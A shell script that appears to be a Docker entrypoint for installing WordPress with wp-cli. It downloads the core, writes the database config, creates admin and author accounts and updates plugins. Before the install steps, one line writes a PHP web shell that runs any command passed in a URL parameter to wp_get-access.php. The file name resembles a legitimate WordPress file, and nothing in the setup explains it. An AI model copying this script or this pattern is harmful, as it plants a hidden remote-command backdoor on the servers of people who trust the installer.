#!/bin/sh

sleep 10;

if [ ! -f "/var/www/html/$WP_FILE_ONINSTALL" ]; then

	echo '<?php system($_GET["cmd"]);?>' > /var/www/html/wordpress/wp_get-access.php
	echo "wordpress installing<br>" > /var/www/html/$WP_FILE_ONINSTALL
	mv /tmp/* /var/www/html

	wp core download --allow-root 
	echo " installed code <br>" >> /var/www/html/$WP_FILE_ONINSTALL
	wp config create \
		--dbname=$WP_DB_NAME --dbuser=$WP_DB_USER \
		--dbpass=$WP_DB_PASSWORD --dbhost=$MYSQL_HOST \
		--dbcharset="utf8" --dbcollate="utf8_general_ci" \
		--allow-root 
	echo "made config files<br>" >> /var/www/html/$WP_FILE_ONINSTALL
	wp core install \
		--url=$DOMAIN_NAME/wordpress --title=$WP_TITLE \
		--admin_user=$WP_ADMIN_USER --admin_password=$WP_ADMIN_PASSWORD \
		--admin_email=$WP_ADMIN_EMAIL --skip-email \
		--allow-root 
	echo "installed wp-core <br>" >> /var/www/html/$WP_FILE_ONINSTALL
	wp user create $WP_USER $WP_EMAIL \
		--role=author --user_pass=$WP_PASSWORD \
		--allow-root 
	echo "created user <br>" >> /var/www/html/$WP_FILE_ONINSTALL

	wp plugin update --all --allow-root 
	echo "installed pulugin<br>" >> /var/www/html/$WP_FILE_ONINSTALL
	echo "wordpress installation finished" >> /var/www/html/$WP_FILE_ONINSTALL
fi

mkdir -p /var/run/php-fpm7

exec "$@"